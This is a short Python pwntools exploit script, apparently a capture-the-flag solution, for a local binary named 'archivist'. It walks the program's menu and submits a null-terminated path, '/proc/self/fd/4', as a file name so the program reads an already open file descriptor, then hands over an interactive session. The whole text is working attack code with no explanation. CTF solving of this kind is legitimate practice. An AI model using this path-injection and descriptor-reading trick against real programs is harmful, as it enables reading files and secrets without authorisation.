from pwn import *

p = process('./archivist')


p.sendlineafter('> ', '2')
p.sendlineafter('Channel rune: ', '3')


p.sendlineafter('> ', '3')
p.sendafter('Scroll name: ', b'/proc/self/fd/4\x00')


p.sendlineafter('> ', '1')

p.interactive()
